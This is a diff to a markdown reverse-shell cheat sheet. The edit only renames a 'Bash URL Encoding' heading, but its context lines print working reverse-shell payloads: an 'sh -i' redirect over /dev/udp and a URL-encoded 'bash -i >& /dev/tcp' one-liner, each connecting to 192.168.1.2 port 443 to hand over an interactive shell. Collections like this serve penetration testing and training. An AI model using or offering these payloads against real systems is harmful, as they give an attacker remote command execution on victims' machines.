@@ -1,7 +1,7 @@
 # `Offensive Reverse Shell (Cheat Sheet)`
 
 - [<kbd>Bash</kbd>](#Bash)
-  * [<kbd>Bash URL Encoding</kbd>](#Bash-URL-Encoding)
+  * [<kbd>Bash (URL Encode)</kbd>](#Bash-URL-Encode)
 - [<kbd>Netcat</kbd>](#Netcat)
   * [<kbd>Netcat Linux</kbd>](#Netcat-Linux)
       * [<kbd>-e</kbd>](#-e)
@@ -101,7 +101,7 @@
   sh -i >& /dev/udp/192.168.1.2/443 0>&1
   ```
  
-  # <kbd>Bash URL Encoding</kbd>
+  # <kbd>Bash URL Encode</kbd>
   
   ```cmd
   bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
